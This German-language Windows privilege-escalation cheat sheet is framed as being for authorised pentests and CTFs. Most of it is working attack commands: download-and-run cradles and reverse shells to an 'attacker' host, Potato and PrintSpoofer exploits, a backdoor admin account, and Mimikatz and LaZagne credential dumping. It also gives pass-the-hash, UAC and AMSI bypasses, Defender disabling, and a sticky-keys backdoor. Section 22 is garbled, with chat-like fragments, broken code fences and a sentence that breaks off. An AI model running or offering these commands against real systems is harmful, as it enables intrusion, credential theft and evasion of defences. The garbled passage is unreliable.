# Windows Privilege Escalation - Autorisierter Pentest Cheat Sheet

**Warnung**: Diese Methoden sind NUR für autorisierte Penetrationstests, CTF-Challenges, Sicherheitsforschung und forensische Analysen auf eigenen/genehmigten Systemen.
**Registry-basierte:**

- **AlwaysInstallElevated** - MSI packages laufen als SYSTEM
- **Stored credentials** in Registry (`reg query HKLM /f password /t REG_SZ /s`)
- **Service registry permissions** - Registry keys von Services überschreiben

**Scheduled Tasks:**

- **Writable task binaries** - Tasks die als SYSTEM/Admin laufen
- **Missing binaries** in scheduled tasks
- **Weak folder permissions** wo task binaries liegen

**Weitere File/Folder basierte:**

- **Startup folder permissions** - Programme die bei Login starten
- **PATH hijacking** - Executable in PATH vor dem echten binary platzieren
- **Weak service folder permissions** - Kompletten service folder überschreiben
- **Configuration files** mit cleartext passwords (web.config, app.config, etc.)

**Token/Process basierte:**

- **Process token impersonation** ohne die Standard-Tools
- **Weak process permissions** - In andere Processes injizieren
- **UAC bypass** techniques (wenn User in Admin group ist)

**Kernel/Driver:**

- **Kernel exploits** für spezifische Windows versions
- **Driver vulnerabilities**

**Enumeration Tools für systematisches Checking:**

- **WinPEAS** - automatisiert fast alles
- **PrivescCheck.ps1** - PowerShell-basiert
- **Seatbelt** - .NET executable
---

## Inhaltsverzeichnis
1. [Enumeration & Information Gathering](#enumeration--information-gathering)
2. [Kernel Exploits](#kernel-exploits)
3. [Service Exploits](#service-exploits)
4. [Registry Exploits](#registry-exploits)
5. [Scheduled Tasks & Startup](#scheduled-tasks--startup)
6. [Token Manipulation](#token-manipulation)
7. [DLL Hijacking](#dll-hijacking)
8. [Unquoted Service Paths](#unquoted-service-paths)
9. [Always Install Elevated](#always-install-elevated)
10. [Stored Credentials](#stored-credentials)
11. [SAM & LSA Secrets](#sam--lsa-secrets)
12. [Pass-the-Hash / Pass-the-Ticket](#pass-the-hash--pass-the-ticket)
13. [UAC Bypass](#uac-bypass)
14. [Group Policy Preferences (GPP)](#group-policy-preferences-gpp)
15. [Hot Potato / Rotten Potato](#hot-potato--rotten-potato)
16. [PrintSpoofer / RoguePotato](#printspoofer--roguepotato)
17. [AlwaysInstallElevated](#alwaysinstallelevated)
18. [Weak File/Folder Permissions](#weak-filefolder-permissions)
19. [SeImpersonate / SeAssignPrimaryToken](#seimpersonate--seassignprimarytoken)
20. [Andere Privileges](#andere-privileges)
21. [Credential Manager](#credential-manager)
22. [RunAs / SavedCreds](#runas--savedcreds)
23. [Kerberos Delegation](#kerberos-delegation)
24. [WSUS Exploitation](#wsus-exploitation)
25. [Anti-Virus Evasion](#anti-virus-evasion)
26. [Post-Exploitation](#post-exploitation)

---

## Enumeration & Information Gathering

### 1. Systeminfo
**Beschreibung**: Grundlegende Systeminformationen sammeln
```cmd
systeminfo
systeminfo | findstr /B /C:"OS Name" /C:"OS Version" /C:"System Type"

# Hostname
hostname

# Hotfixes/Patches
wmic qfe get Caption,Description,HotFixID,InstalledOn

# Architecture
wmic os get osarchitecture
```
**Vorteile**: Nativ, keine zusätzlichen Tools
**Nachteile**: Kann geloggt werden

### 2. Benutzerinformationen
```cmd
# Aktueller Benutzer
whoami
whoami /priv
whoami /groups
whoami /all

# Alle lokalen Benutzer
net user
net user <username>

# Lokale Gruppen
net localgroup
net localgroup Administrators
```

### 3. Netzwerkinformationen
```cmd
ipconfig /all
route print
arp -a

# Firewall
netsh firewall show state
netsh firewall show config
netsh advfirewall firewall show rule name=all

# Offene Ports/Connections
netstat -ano
```

### 4. Prozesse & Services
```cmd
# Prozesse
tasklist /v
tasklist /svc
wmic process list brief
wmic process get name,processid,parentprocessid,executablepath

# Services
sc query
sc queryex type=service state=all
wmic service list brief
wmic service get name,displayname,pathname,startmode
```

### 5. Scheduled Tasks
```cmd
schtasks /query /fo LIST /v
schtasks /query /fo LIST /v | findstr /i "Task To Run:"

# Mit PowerShell
Get-ScheduledTask | where {$_.TaskPath -notlike "\Microsoft*"} | ft TaskName,TaskPath,State
```

### 6. Installed Software
```cmd
wmic product get name,version,vendor
wmic product list brief

# Registry check
reg query HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Uninstall
reg query HKCU\SOFTWARE\Microsoft\Windows\CurrentVersion\Uninstall
```

### 7. Drives & Shares
```cmd
# Laufwerke
wmic logicaldisk get caption,description,providername
fsutil fsinfo drives

# Netzwerk-Shares
net share
wmic share list brief
```

### 8. Automated Enumeration Scripts
```powershell
# WinPEAS
winPEASx64.exe
winPEASx64.exe quiet

# PowerUp
powershell -ep bypass
. .\PowerUp.ps1
Invoke-AllChecks

# PrivescCheck
. .\PrivescCheck.ps1
Invoke-PrivescCheck -Extended -Report PrivescCheck_$($env:COMPUTERNAME) -Format HTML,CSV

# Seatbelt
Seatbelt.exe -group=all
Seatbelt.exe -group=system
Seatbelt.exe -group=user

# JAWS
powershell.exe -ExecutionPolicy Bypass -File .\jaws-enum.ps1 -OutputFilename jaws.txt

# Sherlock (deprecated but still works)
. .\Sherlock.ps1
Find-AllVulns

# Windows-Exploit-Suggester
python windows-exploit-suggester.py --database 2021-09-01-mssb.xls --systeminfo systeminfo.txt
```

---

## Kernel Exploits

### 9. Kernel Exploit Identification
```bash
# Windows Exploit Suggester (lokal)
python windows-exploit-suggester.py --database db.xls --systeminfo sysinfo.txt

# Watson
Watson.exe

# Sherlock
Find-AllVulns
```

### 10. Bekannte Kernel Exploits

#### MS16-032 (Secondary Logon Handle)
```powershell
# PowerShell Empire
Invoke-MS16032 -Command "iex(New-Object Net.WebClient).DownloadString('http://attacker/shell.ps1')"
```

#### MS16-135 (Win32k Elevation of Privilege)
```cmd
MS16-135.exe
```

#### MS17-010 (EternalBlue) - für LPE
```bash
# Meist als Remote Exploit, kann aber für LPE genutzt werden
```

#### CVE-2021-1675 / CVE-2021-34527 (PrintNightmare)
```powershell
# LPE Variante
Import-Module .\CVE-2021-1675.ps1
Invoke-Nightmare

# Fügt neuen Admin-User hinzu
```

#### CVE-2021-36934 (HiveNightmare / SeriousSAM)
```cmd
# Exploitet Shadow Copy für SAM-Zugriff
icacls C:\Windows\System32\config\SAM
```

#### CVE-2020-0787 (BITS LPE)
```cmd
CVE-2020-0787.exe
```

#### CVE-2019-1388 (UAC Bypass + LPE)
```cmd
# Über Certificate Dialog
hhupd.exe
```

#### CVE-2018-8120 (Win32k LPE)
```cmd
CVE-2018-8120.exe
```

---

## Service Exploits

### 11. Insecure Service Permissions
**Beschreibung**: Service mit modifizierbaren Berechtigungen
```cmd
# Enumeration
accesschk.exe /accepteula -uwcqv "Authenticated Users" *
accesschk.exe /accepteula -uwcqv %USERNAME% *
accesschk.exe /accepteula -ucqv <ServiceName>

# PowerShell
Get-Acl HKLM:\System\CurrentControlSet\Services\* | Format-List

# Service Config ändern
sc config <ServiceName> binpath= "C:\temp\reverse.exe"
sc stop <ServiceName>
sc start <ServiceName>

# Mit Metasploit
use exploit/windows/local/service_permissions
```
**Vorteile**: Oft übersehen
**Nachteile**: Benötigt Service-Neustart

### 12. Unquoted Service Path
**Beschreibung**: Service-Pfad ohne Anführungszeichen
```cmd
# Suchen
wmic service get name,displayname,pathname,startmode | findstr /i "Auto" | findstr /i /v "C:\Windows\\" | findstr /i /v """

# PowerShell
Get-WmiObject -Class Win32_Service | Where {$_.PathName -notmatch "`"" -and $_.PathName -notmatch "C:\\Windows"} | Select Name, PathName, StartMode

# Exploitation (Beispiel: C:\Program Files\My Service\service.exe)
# Erstelle: C:\Program.exe oder C:\Program Files\My.exe
icacls "C:\Program Files"
```

### 13. Weak Service Binary Permissions
```cmd
# Prüfen welche Services modifizierbare Binaries haben
accesschk.exe /accepteula -quvw "C:\Program Files\*"
icacls "C:\path\to\service.exe"

# Binary ersetzen
copy evil.exe "C:\path\to\service.exe"
sc stop <ServiceName>
sc start <ServiceName>
```

### 14. Service Registry Permissions
```cmd
# Registry Keys für Services prüfen
accesschk.exe /accepteula -kvuqsw hklm\System\CurrentControlSet\Services

# ImagePath modifizieren
reg add HKLM\SYSTEM\CurrentControlSet\Services\<ServiceName> /v ImagePath /t REG_EXPAND_SZ /d C:\temp\evil.exe /f
```

### 15. DLL Hijacking in Services
```cmd
# Fehlende DLLs identifizieren (Process Monitor)
# Eigene DLL in PATH platzieren
```

---

## Registry Exploits

### 16. AutoRuns Registry Keys
```cmd
# HKCU (Current User)
reg query HKCU\Software\Microsoft\Windows\CurrentVersion\Run
reg query HKCU\Software\Microsoft\Windows\CurrentVersion\RunOnce

# HKLM (Alle User, erfordert Admin)
reg query HKLM\Software\Microsoft\Windows\CurrentVersion\Run
reg query HKLM\Software\Microsoft\Windows\CurrentVersion\RunOnce

# Modifizieren
reg add "HKCU\Software\Microsoft\Windows\CurrentVersion\Run" /v Backdoor /t REG_SZ /d "C:\temp\evil.exe"

# Alle AutoRun Locations
autorunsc.exe -a * -c -nobanner
```

### 17. AlwaysInstallElevated
```cmd
# Prüfen ob aktiviert
reg query HKCU\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated
reg query HKLM\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated

# Beide müssen 0x1 sein
# MSI Package mit Payload erstellen
msfvenom -p windows/x64/shell_reverse_tcp LHOST=attacker LPORT=4444 -f msi -o evil.msi
msiexec /quiet /qn /i C:\temp\evil.msi
```

### 18. Stored Passwords in Registry
```cmd
# VNC Passwords
reg query "HKCU\Software\ORL\WinVNC3\Password"
reg query "HKLM\SOFTWARE\RealVNC\WinVNC4" /v password

# PuTTY Sessions
reg query "HKCU\Software\SimonTatham\PuTTY\Sessions"

# SNMP Parameters
reg query "HKLM\SYSTEM\Current\ControlSet\Services\SNMP"

# Autologin Credentials
reg query "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon"
```

---

## Scheduled Tasks & Startup

### 19. Scheduled Tasks mit schwachen Permissions
```cmd
# Alle Tasks auflisten
schtasks /query /fo LIST /v

# Dateiberechtigungen prüfen
icacls C:\path\to\scheduled\script.bat

# Task modifizieren (wenn permissions da sind)
schtasks /Create /TN "MyTask" /TR "C:\temp\evil.exe" /SC DAILY /ST 00:00 /RU SYSTEM

# PowerShell
Get-ScheduledTask | Get-ScheduledTaskInfo
```

### 20. Startup Folders
```cmd
# User Startup (HKCU)
C:\Users\%USERNAME%\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup

# All Users Startup (erfordert oft Admin)
C:\ProgramData\Microsoft\Windows\Start Menu\Programs\StartUp

# Payload platzieren
copy evil.exe "%APPDATA%\Microsoft\Windows\Start Menu\Programs\Startup\"
```

---

## Token Manipulation

### 21. Token Impersonation
```cmd
# Mit Incognito (Metasploit)
use incognito
list_tokens -u
impersonate_token "NT AUTHORITY\\SYSTEM"

# Mit PowerShell
Invoke-TokenManipulation -ImpersonateUser -Username "NT AUTHORITY\SYSTEM"

# Mit PsExec
psexec -s -i cmd.exe
```

### 22. SeImpersonatePrivilege / SeAssignPrimaryTokenPrivilege
**Beschreibung**: Erlaubt Token Impersonation (häufig bei Service-Accounts)
```cmd
# Privilege prüfen
whoami /priv

# Juicy Potato (Windows Server 2008-2016)
JuicyPotato.exe -l 1337 -p C:\temp\nc.exe -a "-e cmd.exe attacker 4444" -t *
JuicyPotato.exe -l 1337 -c "{CLSID}" -p C:\temp\reverse.exe -t *

# RoguePotato (Windows 10, Server 2019+)
RoguePotato.exe -r attacker -e "C:\temp\reverse.exe" -l 9999

# PrintSpoofer (Neuere Windows Versionen)
PrintSpoofer.exe -i -c cmd
bash

```bash
PrintSpoofer.exe -i -c "cmd /c echo OSCP_Proof > C:\Windows\proof.txt"
```

**Datei mit Hostname und Timestamp:**

bash

```bash
PrintSpoofer.exe -i -c "cmd /c echo %COMPUTERNAME%_%DATE%_%TIME% > C:\Windows\pwned.txt"
```

**Whoami-Output als Proof:**

bash

```bash
PrintSpoofer.exe -i -c "cmd /c whoami > C:\Windows\proof.txt"
```

**Mit PowerShell mehr Informationen:**

bash

```bash
PrintSpoofer.exe -i -c "powershell -c \"Get-Date; whoami; hostname | Out-File C:\Windows\proof.txt\""
```

**Oder wenn du auch die Berechtigungen nachweisen willst:**

bash

```bash
PrintSpoofer.exe -i -c "cmd /c whoami /priv > C:\Windows\proof.txt"
```

**Falls C:\Windows schreibgeschützt ist, alternative Locations:**

bash

```bash
# C:\Windows\Temp ist oft beschreibbar
PrintSpoofer.exe -i -c "cmd /c echo Proof > C:\Windows\Temp\proof.txt"

# Oder C:\Windows\Tasks
PrintSpoofer.exe -i -c "cmd /c echo Proof > C:\Windows\Tasks\proof.txt"
```
```bash
PrintSpoofer.exe -i -c "cmd /c net user hacker P@ssw0rd123 /add && net localgroup administrators hacker /add"
```

**Oder in separaten Schritten für bessere Kontrolle:**

1. **User erstellen:**

bash

```bash
PrintSpoofer.exe -i -c "cmd /c net user hacker P@ssw0rd123 /add"
```

2. **Zur Admin-Gruppe hinzufügen:**

bash

```bash
PrintSpoofer.exe -i -c "cmd /c net localgroup administrators hacker /add"
```

**Mit PowerShell (mehr Optionen):**

bash

```bash
PrintSpoofer.exe -i -c "powershell -c \"New-LocalUser -Name 'hacker' -Password (ConvertTo-SecureString 'P@ssw0rd123' -AsPlainText -Force) -PasswordNeverExpires; Add-LocalGroupMember -Group 'Administrators' -Member 'hacker'\""
```

**Verification danach:**

bash

```bash
PrintSpoofer.exe -i -c "cmd /c net user hacker"
PrintSpoofer.exe -i -c "cmd /c net localgroup administrators"
```

**Deutsche Windows-Version:**

bash

```bash
# Administratoren statt administrators
PrintSpoofer.exe -i -c "cmd /c net localgroup Administratoren hacker /add"
```

**Für RDP-Zugang noch:**

bash

```bash
PrintSpoofer.exe -i -c "cmd /c net localgroup 'Remote Desktop Users' hacker /add"
```
Für die OSCP-Prüfung würde ich empfehlen, direkt den Flag oder proof.txt mit `whoami` und
PrintSpoofer.exe -c "C:\temp\reverse.exe"

# GodPotato (Windows 10/11, Server 2019/2022)
GodPotato.exe -cmd "cmd /c whoami"
GodPotato.exe -cmd "C:\temp\reverse.exe"

# RemotePotato0
RemotePotato0.exe -m 2 -r attacker -x attacker -p 9999 -s 1
```
**Vorteile**: Sehr häufig auf IIS, SQL Server
**Nachteile**: CLSID kann variieren

### 23. Access Tokens
```cmd
# Mimikatz
privilege::debug
token::elevate
token::list /user:administrator
token::elevate /domainadmin
```

---

## DLL Hijacking

### 24. DLL Search Order Hijacking
**Beschreibung**: Ausnutzung der DLL-Ladereihenfolge
```cmd
# Search Order:
# 1. Application Directory
# 2. C:\Windows\System32
# 3. C:\Windows\System
# 4. C:\Windows
# 5. Current Directory
# 6. %PATH%

# Mit Process Monitor fehlende DLLs finden
# Filter: Result is "NAME NOT FOUND", Path contains ".dll"

# Eigene DLL erstellen
msfvenom -p windows/x64/shell_reverse_tcp LHOST=attacker LPORT=4444 -f dll -o hijack.dll

# In application directory platzieren
copy hijack.dll "C:\Program Files\App\missing.dll"
```

### 25. DLL Proxying/Forwarding
```c
// Original DLL Funktionen forwarden
#pragma comment(linker,"/export:OriginalFunction=original.OriginalFunction")
```

### 26. Phantom DLL Hijacking
**Beschreibung**: Registrierte aber nicht existierende DLLs
```cmd
# Mit Procmon suchen nach "NAME NOT FOUND" + ".dll"
```

---

## Unquoted Service Paths

### 27. Unquoted Service Path Exploitation
```cmd
# Suchen
wmic service get name,displayname,pathname,startmode | findstr /i "Auto" | findstr /i /v "C:\Windows\\" | findstr /i /v """

# PowerUp
Get-UnquotedService

# Beispiel: C:\Program Files\My App\service.exe
# Windows sucht in dieser Reihenfolge:
# C:\Program.exe
# C:\Program Files\My.exe
# C:\Program Files\My App\service.exe

# Permissions prüfen
icacls "C:\Program Files"
icacls "C:\Program Files\My App"

# Exploit platzieren
copy evil.exe "C:\Program Files\My.exe"
sc stop "ServiceName"
sc start "ServiceName"
```

---

## Always Install Elevated

### 28. AlwaysInstallElevated Policy
```cmd
# Check beide Registry Schlüssel
reg query HKCU\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated
reg query HKLM\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated

# Wenn beide 0x1:
# MSI Payload
msfvenom -p windows/x64/shell_reverse_tcp LHOST=attacker LPORT=4444 -f msi -o shell.msi

# Installieren (wird mit SYSTEM Rechten ausgeführt)
msiexec /quiet /qn /i C:\temp\shell.msi

# Mit Metasploit
use exploit/windows/local/always_install_elevated
```

---

## Stored Credentials

### 29. Credentials in Files
```cmd
# Unattend.xml (Windows Installation)
C:\unattend.xml
C:\Windows\Panther\Unattend.xml
C:\Windows\Panther\Unattend\Unattend.xml
C:\Windows\system32\sysprep\sysprep.xml
C:\Windows\system32\sysprep\Unattend.xml

# Suche nach Passwörtern in Files
findstr /si password *.txt *.xml *.ini *.config
dir /s *pass* == *cred* == *vnc* == *.config*

# PowerShell
Get-ChildItem -Path C:\ -Include *.txt,*.xml,*.ini,*.config -Recurse -ErrorAction SilentlyContinue | Select-String -Pattern "password"
```

### 30. Registry Credentials
```cmd
# Saved RDP Connections
cmdkey /list

# Credential Manager (GUI)
control /name Microsoft.CredentialManager

# VNC
reg query "HKCU\Software\ORL\WinVNC3\Password"

# Windows Autologin
reg query "HKLM\SOFTWARE\Microsoft\Windows NT\Currentversion\Winlogon"

# SNMP
reg query HKLM\SYSTEM\CurrentControlSet\Services\SNMP /s

# PuTTY
reg query HKCU\Software\SimonTatham\PuTTY\Sessions /s
```

### 31. Credentials in Memory
```powershell
# Mimikatz
privilege::debug
sekurlsa::logonpasswords
sekurlsa::tickets
sekurlsa::wdigest

# LaZagne
laZagne.exe all

# SessionGopher (RDP/WinSCP/PuTTY Sessions)
Import-Module .\SessionGopher.ps1
Invoke-SessionGopher -Thorough
```

### 32. WiFi Passwords
```cmd
netsh wlan show profile
netsh wlan show profile name="SSID" key=clear

# Alle WiFi Passwörter
for /f "tokens=2 delims=:" %a in ('netsh wlan show profiles ^| findstr "All User Profile"') do @echo off & netsh wlan show profile %a key=clear | findstr "Key Content"
```

### 33. Browser Credentials
```powershell
# SharpChrome
SharpChrome.exe logins

# LaZagne
laZagne.exe browsers
```

---

## SAM & LSA Secrets

### 34. SAM Database Dump
```cmd
# Registry Hives sichern
reg save HKLM\SAM C:\temp\sam
reg save HKLM\SYSTEM C:\temp\system
reg save HKLM\SECURITY C:\temp\security

# Mit Volume Shadow Copy
vssadmin create shadow /for=C:
copy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy1\Windows\System32\config\SAM C:\temp\
copy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy1\Windows\System32\config\SYSTEM C:\temp\

# Offline Extraction
impacket-secretsdump -sam sam -system system LOCAL
mimikatz.exe "lsadump::sam /system:system /sam:sam"
```

### 35. LSA Secrets
```cmd
# Mimikatz (erfordert SYSTEM oder Debug Privilege)
privilege::debug
token::elevate
lsadump::secrets

# LSA Secrets können enthalten:
# - Service Account Passwords
# - VPN Credentials
# - Auto-logon Credentials
# - Scheduled Task Credentials
```

---

## Pass-the-Hash / Pass-the-Ticket

### 36. Pass-the-Hash (PTH)
```bash
# Mit pth-toolkit
pth-winexe -U domain/user%hash //target cmd

# Mit impacket
impacket-psexec -hashes :NTHASH user@target
impacket-wmiexec -hashes :NTHASH user@target
impacket-smbexec -hashes :NTHASH user@target

# Mit CrackMapExec
crackmapexec smb target -u user -H NTHASH

# Mimikatz
sekurlsa::pth /user:Administrator /domain:. /ntlm:HASH /run:cmd.exe
```

### 37. Pass-the-Ticket (PTT)
```cmd
# Mimikatz - Tickets exportieren
privilege::debug
sekurlsa::tickets /export

# Ticket injizieren
kerberos::ptt ticket.kirbi

# Verify
klist
```

### 38. OverPass-the-Hash (Pass-the-Key)
```cmd
# Mimikatz
sekurlsa::pth /user:Administrator /domain:domain.local /ntlm:HASH /run:powershell.exe

# Dann im neuen Fenster
net use \\dc01\c$
klist
```

---

## UAC Bypass

### 39. UAC Bypass Techniken

#### fodhelper.exe (Windows 10)
```cmd
# Registry Key setzen
reg add HKCU\Software\Classes\ms-settings\Shell\Open\command /ve /d "C:\temp\reverse.exe" /f
reg add HKCU\Software\Classes\ms-settings\Shell\Open\command /v DelegateExecute /f

# Trigger
fodhelper.exe

# Cleanup
reg delete HKCU\Software\Classes\ms-settings /f
```

#### eventvwr.exe
```cmd
reg add HKCU\Software\Classes\mscfile\shell\open\command /ve /d "C:\temp\reverse.exe" /f
eventvwr.exe
reg delete HKCU\Software\Classes\mscfile /f
```

#### computerdefaults.exe
```cmd
reg add HKCU\Software\Classes\ms-settings\Shell\Open\command /ve /d "cmd.exe" /f
reg add HKCU\Software\Classes\ms-settings\Shell\Open\command /v DelegateExecute /f
computerdefaults.exe
```

#### sdclt.exe (App Paths)
```cmd
reg add "HKCU\Software\Microsoft\Windows\CurrentVersion\App Paths\control.exe" /ve /d "C:\temp\reverse.exe" /f
sdclt.exe /KickOffElev
```

#### DiskCleanup (cleanmgr.exe + schtasks)
```cmd
# Automated mit UACME
UACME.exe 34
```

### 40. UACME - Automated UAC Bypass
```cmd
# 60+ UAC Bypass Methoden
Akagi64.exe <method_number>

# Beispiele
Akagi64.exe 23  # cliconfg
Akagi64.exe 33  # sdclt
Akagi64.exe 41  # event viewer
```

---

## Group Policy Preferences (GPP)

### 41. GPP Passwords (cpassword)
```cmd
# Suche nach Groups.xml, ScheduledTasks.xml, Services.xml, etc.
# In SYSVOL
findstr /S /I cpassword \\domain.local\sysvol\*.xml

# Dekodieren (AES Key ist public)
gpp-decrypt "cpassword_value"

# PowerShell
Get-GPPPassword

# Metasploit
use post/windows/gather/credentials/gpp
```

### 42. GPP Autologin
```xml
<!-- In Registry.xml -->
<Properties action="U" ... cpassword="encrypted" ... />
```

---

## Hot Potato / Rotten Potato

### 43. Hot Potato (MS16-075)
**Beschreibung**: NBNS Spoofing + NTLM Relay
```cmd
# Hot Potato
potato.exe -ip attacker -cmd "C:\temp\reverse.exe" -enable_httpserver true -enable_defender true

# Windows 7-10, Server 2008-2012
```
**Vorteile**: Funktioniert ohne Admin
**Nachteile**: Gepatcht ab August 2016

### 44. Rotten Potato
**Beschreibung**: Token Impersonation via DCOM
```cmd
rottenpotato.exe

# Meist über Meterpreter
use incognito
list_tokens -u
impersonate_token "NT AUTHORITY\\SYSTEM"
```

### 45. Lonely Potato
```cmd
# Kombination aus Rotten Potato + DCOM
```

---

## PrintSpoofer / RoguePotato

### 46. PrintSpoofer (Windows 10/Server 2016+)
```cmd
# Einfach
PrintSpoofer.exe -i -c cmd

# Mit Befehl
PrintSpoofer.exe -c "C:\temp\nc.exe attacker 4444 -e cmd.exe"

# PowerShell
PrintSpoofer.exe -c "powershell -ep bypass -c IEX(New-Object Net.WebClient).DownloadString('http://attacker/shell.ps1')"
```
**Vorteile**: Funktioniert auf neueren Windows
**Nachteile**: Benötigt SeImpersonatePrivilege

### 47. RoguePotato
```cmd
# Attacker Machine (Redirector)
socat tcp-listen:135,reuseaddr,fork tcp:target:9999

# Victim
RoguePotato.exe -r attacker_ip -e "C:\temp\reverse.exe" -l 9999
```

### 48. RemotePotato0
```cmd
# Remote NTLM Relay + Impersonation
RemotePotato0.exe -m 2 -r attacker -x attacker -p 9999 -s 1
```

---

## AlwaysInstallElevated

(Siehe #17 und #28 - bereits abgedeckt)

---

## Weak File/Folder Permissions

### 49. Writable System Folders
```cmd
# Program Files prüfen
accesschk.exe -dqv "C:\Program Files"
accesschk.exe -wuqv "C:\Program Files"

# Services Binaries
accesschk.exe -wvu "C:\Program Files\*"

# PowerShell
Get-ChildItem "C:\Program Files" -Recurse | Get-ACL | ?{$_.AccessToString -match "Everyone\sAllow\s\sModify"}
```

### 50. PATH Hijacking
```cmd
# PATH Variable prüfen
echo %PATH%

# Writable Directories in PATH finden
for %%A in ("%path:;=";"%") do ( cmd.exe /c icacls "%%~A" 2>nul | findstr /i "(F) (M) (W) :\" | findstr /i ":\\ everyone authenticated users todos %username%" && echo. )

# Malicious executable in writable PATH dir platzieren
```

### 51. Service Executable Path
```cmd
# Schwache Permissions auf Service Binary
sc qc <ServiceName>
icacls "C:\path\to\service.exe"

# Wenn modifizierbar:
copy evil.exe "C:\path\to\service.exe"
sc stop <ServiceName>
sc start <ServiceName>
```

---

## SeImpersonate / SeAssignPrimaryToken

(Siehe #22 - bereits ausführlich abgedeckt)

### 52. Token-basierte Exploits (Zusammenfassung)
- **JuicyPotato**: Server 2008-2016
- **RoguePotato**: Server 2019, Windows 10
- **PrintSpoofer**: Windows 10, Server 2016-2022
- **GodPotato**: Windows 10/11, Server 2019-2022
- **RemotePotato0**: Remote Exploitation

---

## Andere Privileges

### 53. SeBackupPrivilege
**Beschreibung**: Erlaubt Lesen aller Dateien (Backup Operators Gruppe)
```cmd
# SAM/SYSTEM kopieren
reg save HKLM\SAM C:\temp\sam
reg save HKLM\SYSTEM C:\temp\system

# Mit diskshadow + robocopy
# Siehe: https://github.com/giuliano108/SeBackupPrivilege

# SeBackupPrivilege exploit
SeBackupPrivilegeCmdLets.dll import
Copy-FileSeBackupPrivilege C:\Windows\NTDS\ntds.dit C:\temp\ntds.dit
```

### 54. SeRestorePrivilege
**Beschreibung**: Erlaubt Schreiben aller Dateien
```cmd
# Service Binary überschreiben
# Registry Keys modifizieren
# ACLs ändern

# Mit utilman.exe
# System-Binary überschreiben für Backdoor
```

### 55. SeTakeOwnershipPrivilege
```cmd
# Ownership von Datei übernehmen
takeown /f "C:\Windows\System32\Utilman.exe"
icacls "C:\Windows\System32\Utilman.exe" /grant %username%:F

# Datei ersetzen
copy cmd.exe Utilman.exe

# Am Login Screen: Utilman.exe öffnet cmd als SYSTEM
```

### 56. SeLoadDriverPrivilege
```cmd
# Malicious Kernel Driver laden
# Capcom.sys Exploit
# EoPLoadDriver exploit
```

### 57. SeDebugPrivilege
```cmd
# Erlaubt Debuggen aller Prozesse
# LSASS dumpen
# Process Injection

# Mimikatz
privilege::debug
sekurlsa::logonpasswords
```

---

## Credential Manager

### 58. Windows Credential Manager
```cmd
# GUI
rundll32.exe keymgr.dll,KRShowKeyMgr

# CLI
cmdkey /list

# Credentials mit runas verwenden
runas /savecred /user:admin "C:\temp\reverse.exe"

# VaultCmd
VaultCmd /list
VaultCmd /listcreds:"Windows Credentials" /all

# PowerShell
[void][Windows.Security.Credentials.PasswordVault,Windows.Security.Credentials,ContentType=WindowsRuntime]
$vault = New-Object Windows.Security.Credentials.PasswordVault
$vault.RetrieveAll() | % { $_.RetrievePassword(); $_ }
```

---

## RunAs / SavedCreds

### 59. RunAs mit gespeicherten Credentials
```cmd
# Prüfen
cmdkey /list

# Wenn Credentials gespeichert:
runas /savecred /user:DOMAIN\Administrator "cmd.exe /c whoami > C:\temp\proof.txt"
runas /savecred /user:admin "C:\temp\reverse.exe"

# PowerShell
$pass = ConvertTo-SecureString "password" -AsPlainText -Force
$cred = New-Object System.Management.Automation.PSCredential("Administrator", $pass)
Start-Process cmd.exe -Credential $cred
```

---

## Kerberos Delegation

### 60. Unconstrained Delegation
```cmd
# Identifikation
Get-ADComputer -Filter {TrustedForDelegation -eq $True}

# Exploitation
# Erzwinge Authentication von DC zu kompromittiertem Host
# TGT von DC stehlen
```

### 61. Constrained Delegation
```cmd
# S4U2Self + S4U2Proxy
# Mit Rubeus
Rubeus.exe s4u /user:serviceaccount /rc4:HASH /impersonateuser:administrator /msdsspn:cifs/target /ptt
```

### 62. Resource-Based Constrained Delegation
```cmd
# msDS-AllowedToActOnBehalfOfOtherIdentity
# Siehe: https://www.harmj0y.net/blog/activedirectory/a-case-study-in-wagging-the-dog-computer-takeover/
```

---

## WSUS Exploitation

### 63. WSUS HTTP (No SSL)
```bash
# Mit SharpWSUS
SharpWSUS.exe locate
SharpWSUS.exe inspect
SharpWSUS.exe create /payload:"C:\temp\reverse.exe" /args:"/c cmd.exe" /title:"Update"

# Mit PyWSUS
python3 pywsus.py -H attacker -p 8530 -e PsExec64.exe -c "/accepteula /s cmd.exe /c reverse.exe"
```
**Vorteile**: Code Execution mit SYSTEM
**Nachteile**: Benötigt WSUS über HTTP (nicht HTTPS)

---

## Anti-Virus Evasion

### 64. AV Detection
```cmd
# Installed AV
wmic /namespace:\\root\securitycenter2 path antivirusproduct get displayname,productstate

# Windows Defender Status
sc query WinDefend
Get-MpComputerStatus
Get-MpPreference

# Exclusions
Get-MpPreference | Select-Object -ExpandProperty ExclusionPath
Get-MpPreference | Select-Object -ExpandProperty ExclusionExtension
```

### 65. AMSI Bypass
```powershell
# AMSI Bypass Variante 1
[Ref].Assembly.GetType('System.Management.Automation.AmsiUtils').GetField('amsiInitFailed','NonPublic,Static').SetValue($null,$true)

# Variante 2 (obfuscated)
$a=[Ref].Assembly.GetTypes();Foreach($b in $a){if($b.Name -like "*iUtils"){$c=$b}};$d=$c.GetFields('NonPublic,Static');Foreach($e in $d){if($e.Name -like "*Context"){$f=$e}};$g=$f.GetValue($null);[IntPtr]$ptr=$g;[Int32[]]$buf=@(0);[System.Runtime.InteropServices.Marshal]::Copy($buf,0,$ptr,1)

# AMSITrigger - AMSI Signaturen finden
amsitrigger.exe -i script.ps1
```

### 66. Obfuscation
```powershell
# Invoke-Obfuscation
Import-Module ./Invoke-Obfuscation.psd1
Invoke-Obfuscation

# Obfuscate Payload
```

### 67. Defender Exclusions hinzufügen (wenn Admin)
```powershell
Add-MpPreference -ExclusionPath "C:\temp"
Add-MpPreference -ExclusionExtension "exe"
Set-MpPreference -DisableRealtimeMonitoring $true
```

---

## Post-Exploitation

### 68. Persistence Mechanismen

#### Sticky Keys Backdoor
```cmd
# Am Target (erfordert SYSTEM)
copy C:\Windows\System32\cmd.exe C:\Windows\System32\sethc.exe

# Am Login Screen: 5x Shift drücken -> cmd als SYSTEM
```
